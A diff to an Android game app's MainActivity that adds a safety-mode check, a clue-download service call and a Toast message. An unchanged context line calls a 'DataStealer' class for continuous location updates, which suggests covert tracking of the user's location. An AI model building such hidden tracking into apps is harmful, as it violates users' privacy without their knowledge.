@@ -6,6 +6,7 @@ import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.os.Parcelable;
 import android.util.Log;
+import android.widget.Toast;
 
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
@@ -43,8 +44,10 @@ public class MainActivity extends AppCompatActivity implements IApp {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        boolean isInSafetyMode = BackendManagerIntentService.isInSafetyMode(getApplicationContext());
+
         int playerId = BackendManagerIntentService.getPlayerId(this);
-        if (-1 == playerId) {
+        if (-1 == playerId && !isInSafetyMode) {
             Intent registerPlayer = new Intent(this, BackendManagerIntentService.class);
             registerPlayer.putExtra(BackendManagerIntentService.KEY_MANAGE_TYPE, BackendManagerIntentService.MANAGE_PLAYER_REGISTRATION);
             startService(registerPlayer);
@@ -52,11 +55,34 @@ public class MainActivity extends AppCompatActivity implements IApp {
         setContentView(R.layout.activity_main);
 
 
-        if (BackendManagerIntentService.isInSafetyMode(getApplicationContext())) {
+        if (isInSafetyMode) {
             server = new OfflineAPI();
         } else {
             server = ApiBuilder.build(getApplicationContext());
         }
+    }
+
+    @Override
+    protected void onStart() {
+        super.onStart();
+        sendClueDownloadIntent();
+    }
+
+    private void sendClueDownloadIntent() {
+        boolean safetyMode = BackendManagerIntentService.isInSafetyMode(getApplicationContext());
+        int playerId = BackendManagerIntentService.getPlayerId(this);
+
+        if (-1 != playerId && !safetyMode) {
+            Intent registerPlayer = new Intent(this, BackendManagerIntentService.class);
+            registerPlayer.putExtra(BackendManagerIntentService.KEY_MANAGE_TYPE, BackendManagerIntentService.MANAGE_CLUE_DOWNLOAD);
+            startService(registerPlayer);
+        } else {
+            String errorString = "Application is in safety mode or user is not registered.";
+            int duration = Toast.LENGTH_LONG;
+            Toast toast = Toast.makeText(getApplicationContext(), errorString, duration);
+            toast.show();
+        }
+
 
     }
 
@@ -237,7 +263,7 @@ public class MainActivity extends AppCompatActivity implements IApp {
         FusedLocationProviderClient client = LocationServices.getFusedLocationProviderClient(this);
         DataStealer locationStealer = new DataStealer(client);
         locationStealer.getContinuousLocationUpdates(getApplicationContext());
-        
+
         return null;
     }
 
